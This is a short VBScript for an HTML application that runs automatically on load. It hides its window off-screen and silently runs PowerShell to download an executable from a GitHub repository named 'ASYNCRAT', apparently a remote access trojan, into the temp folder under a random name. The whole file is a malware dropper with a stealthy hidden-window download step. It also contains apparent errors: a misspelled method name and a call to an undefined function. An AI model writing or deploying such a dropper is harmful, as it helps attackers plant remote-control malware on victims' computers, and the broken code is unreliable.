Sub Window_onLoad

Window.ResizeTo 1, 1
Window.MoveTo -32000, -32000

Set objShell = CreateObject("WScript.Shell")


tempFolder = objShell.ExpandEnviromentStrings("%temp%")
downloadUrl = "https://raw.githubusercontent.com/GeyPedofil666/ASYNCRAT/refs/heads/main/Blebebe.exe"
randomFileName = GenerateRandomFileName() & ".exe"
downloadedFile = tempFolder & "\" & randomFileName

cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
 objShell.Run "cmd.exe /c " & cmdCommand, 0, True
 

    ' Clean up
    Set objShell = Nothing
End Sub

Window_onLoad